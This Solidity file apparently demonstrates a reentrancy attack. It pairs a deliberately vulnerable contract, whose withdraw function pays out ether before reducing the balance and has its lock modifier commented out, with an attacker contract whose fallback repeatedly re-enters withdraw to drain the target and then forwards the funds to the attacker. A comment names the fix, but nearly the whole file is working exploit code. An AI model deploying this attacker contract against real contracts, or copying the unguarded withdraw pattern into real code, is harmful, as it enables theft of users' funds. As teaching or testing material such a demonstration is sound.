// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.6.12;

contract VulnerableContract {
    // bool _locked;
    
    // modifier lock() {
    //     require(!_locked);
    //     _locked = true;
    //     _;
    //     _locked = false;
    // }

    mapping(address => uint) _balances;

    function deposit() external payable {
        require(msg.value > 0);
        _balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) external payable {
        require(_balances[msg.sender] >= amount);

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);

        _balances[msg.sender] -= amount;
        // Fix by updating balance before sending eth or use lock modifier
    }
}

contract MaliciousContract {
    VulnerableContract target;
    address attacker;

    constructor(address _target) public {
        target = VulnerableContract(_target);
        attacker = msg.sender;
    }
    
    fallback() external payable {
        if(address(target).balance >= msg.value)
            target.withdraw(msg.value);
    }
    
    /// @notice Call vulnerable function and transfer eth from target smart contract to this one
    function drain() external payable {
        require(msg.value > 0); // send appropriate amount to avoid running out of gas
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    function withdraw() external {
        require(msg.sender == attacker);
        payable(attacker).transfer(address(this).balance);
    }

}
